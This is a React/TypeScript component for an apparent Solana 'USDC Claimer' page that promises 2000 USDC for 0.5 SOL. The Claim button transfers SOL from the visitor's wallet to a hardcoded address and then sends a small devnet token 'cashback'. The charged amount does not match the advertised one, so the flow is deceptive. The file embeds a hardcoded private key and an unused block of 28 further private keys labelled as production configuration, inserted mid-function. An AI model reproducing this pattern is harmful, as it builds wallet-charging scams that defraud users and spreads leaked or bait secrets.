/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4b6SPZGmjsKewjjU16mvYzEgNiidBopqzchZybKyPbmnCjy74ADSBZsg8oQZu3L38cYbQKcJ5FogpkMQPYnSXHTp"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5P2jBzh7tvKMuNeWdFTRhVRLojAC7syhBLXsYoiz85vDUWuxQidpHapDkRcjYqS1wkXvDy2jQ4rbk8BkXpzsupR3",
  "key1": "45ygitWi4xP1uskAGrqecy6xZg7B7uugkW4PyTifRcMXtxxctjSQstAmNKefr84mj2sbZeMEDdqFmN1W3ExaDuXv",
  "key2": "2XBAqhtzLUQfqC3pJxsDBM1GpkBL3sjonH8nwyNwassVqZ6DenG36fW5UCRYZ7kHEikKPCu9g4mEFzFAmH6bFftw",
  "key3": "4DFZrURY4y5KaQzpR3Xsfgh73uSgy98NtHqAm9AuDkXGjmnGWeBW3VNWSN5xqDtgdkvYDEH8WqfHCin4aPfcgB3k",
  "key4": "32pbzxMEhL5Jyr6WcBSJGDFvkBskUT7mRBztjaNcbJipFQs9pncgyF1wKGRvmSpAM69PskT2ZiaMtsQaZGg8gfM5",
  "key5": "37yh4fHMjLPPJTbFTfYDTieVQUCnzjH36nSiChXbVFA7zvRVvfoZ64q7KydLTmyEnBE21RRes2Dh4S6aJB1PiCpe",
  "key6": "4c3yFpHTwKmBvrnN289igAKvKKLBjyXimHX8vem6Q32SBxnrmfh8pPk2XTVj3Ms17RRuboZKwANxK5xfiP93YnGn",
  "key7": "5nYqJUmqQCpZMUHkM7g9pLZ4CUGn8oXqJm7GxPoPmBJrA66a3WxPmsXwKnmnrfDMcF6aBkMWZ2aUD4XeDdTJZzLz",
  "key8": "RStKAShnYZDu4DFvPDRQPmmWd2ERjHkarTWq7p3s75SN7PqFiTKYFKZphfBeDNKzgwu2rnsDFcWpp7cy1xpS37z",
  "key9": "2Tr5tbzU9GGicaqueasxF6ZjCYQtwiv6C5psBSu52dAHs4JB32GmRMTs5hKcK3yXFRHCdCg3YUoBjmdW6LJmSEbt",
  "key10": "5NMo1dd66BpYi6dqBTqPZjm336G5awJYe9tX5Qp8YLapPHuaR3Qyr2AYV9xomW11cCj7rEBjMxT8G4m36mTR4M7s",
  "key11": "44aDCvdgdBFtZyspkXrpNaY81Cx75YFoDQqUTpf3Ud7axPjHdwGAN9R1pebAQK4rUwDrkKzhAshGLKX4nkTxAdo6",
  "key12": "4mBJk6mNTxJKgfaztoZhKH4yKs5d9AoX28hur9R7fBZ4hFd3h688v4qqpVNJDPEA2dEbQREU9chm99p4REyqc9Dn",
  "key13": "5JoKgscxjMEJAxjcJ5GK9Tf44fAdzvUqvGsp89SdSpWwSpkU3Xgf8XJfukgUYibPJxRUyMT9JqAc78yrNQkE3ncq",
  "key14": "3rK9ZN2Bssajusyfo1P4aHFa8xC6sJJzJMr64ubeYTHoN6yCRJuNgCN9jtLqH1WqgRmjzCUkWB5mWcNnvZyk4n5y",
  "key15": "bMi7uGYrDueXoLQCX12rQuJH5wMWan68RQ1eSffcJnFiZbMTTrNQEmXaQowPu7nA34oRt1Q9VhdiXWgmq4WdTbT",
  "key16": "42BCB7kcQBS2XhM2ghiTZp7c9MzzooCkoca5rpyCJPiySHnSmnPYVZzkKprXXK2KNrs2sNYwTYYAqJkUnKdbq9Ud",
  "key17": "63HyJjpdQVJfb2fNW73hPBci47frrvp7m4doq2NZrYj9BQyXwGuhPDG6XBJfRodNjpnvqqjRFMNLvFBupCGjeLRp",
  "key18": "4pWKhkWEbDWkEQctbGwZbFmGTYVS2pN4vuAB5SESEfuZjgPjJs23Kj45T2PfP7ezgazjTvcCNctbwzuoZiqE1ePX",
  "key19": "5SwoWQuupR2CVxKmfizjzsbuBoZhP7dEJwJ9eyqUf9Vsh3ESH7MqM7Uu2TmwAfXwdrJr7KBia2Gq6oU2V2cQ4j4w",
  "key20": "2z4eWUQf8gkxjFPa3nz8BZGZNTi6Pr4CaVs4wyn24fuNuHUV3M4h4LxqRUFknhMDuwsq29StWkfRCL76aEf9Rba2",
  "key21": "2K3sCvJG6PaX7HJp1YJCEPrCek4qUBiYKqAvNsDr5WWqzWeSsnVJBVA19xQwY8bdsn1F6aTY7h6r2JCsb3f9tKmF",
  "key22": "2vwLF31RugJSdmCsivabXp5LAYmz7kmkG59QWr8CkaPAegA2VtXrPv34ZXzodkuUCSAaBZuZ9x9wx9nHS63GMsak",
  "key23": "62CSLZ1nviSjkWuqHBuTspRut5Fi4qQ4XrkX4xuX8DUMGqAV8HQmu8dy1rp3gwo2xn3ASfpwEqUaQyRc9HKJqMic",
  "key24": "HQWJoBwSu9ZMuS7S8uipSrYigiJfwLnMCDd1RQ5VJgd8NRZEktChAqewxzp2Nz8fHfx9kuHETWFzsQNnqyMVCsx",
  "key25": "3SuEcSnTqeJogcQiXwupnw7qpqXH61Gpq6jhKbDw1sCvMTkdq8rQwSfseddfGw93XdpyTdwZ12GwaapgKyRkodHW",
  "key26": "4PP5v73n3QmFPhnvdGK2oWvXn2x9d2PbXs7LqFYqaxdonVUbyYm9xQVYjFhstSYXsA6ZboCD1ajHnraeaiVEDdvr",
  "key27": "67Eaojyo1nYY4VciCdLLpWNXeeSXZcT69S9Lo1WfZMH8Ci7RAxcjrxxc1Mj1dLDjGkNyeYXZZbndnWw7jdymTcMP"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
